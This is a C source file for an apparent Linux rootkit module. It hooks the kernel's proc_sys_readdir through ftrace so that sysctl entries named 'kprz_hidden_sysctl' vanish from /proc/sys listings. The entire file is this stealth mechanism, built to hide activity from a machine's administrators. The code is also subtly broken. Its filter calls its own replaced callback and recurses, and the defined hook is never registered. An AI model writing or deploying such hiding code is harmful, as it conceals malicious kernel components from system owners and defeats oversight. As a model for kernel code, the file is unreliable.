#include "sysctl_hiding.h"
#include "ftrace_hook.h"
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/string.h>

asmlinkage int (*real_proc_sys_readdir)(struct file *file, struct dir_context *ctx);

static bool hidden_sysctl_filldir(struct dir_context *ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type) {
    if (strstr(name, "kprz_hidden_sysctl"))
        return false;
    return ctx->actor(ctx, name, namelen, offset, ino, d_type);
}

static int hooked_proc_sys_readdir(struct file *file, struct dir_context *ctx) {
    struct dir_context temp_ctx = *ctx;
    temp_ctx.actor = hidden_sysctl_filldir;
    return real_proc_sys_readdir(file, &temp_ctx);
}

static struct fh_hook sysctl_hook = {
    .name = "proc_sys_readdir",
    .func = hooked_proc_sys_readdir,
    .orig = &real_proc_sys_readdir,
};

void setup_sysctl_hiding(void) {
    fh_install_all();
}

void remove_sysctl_hiding(void) {
    fh_remove_all();
}
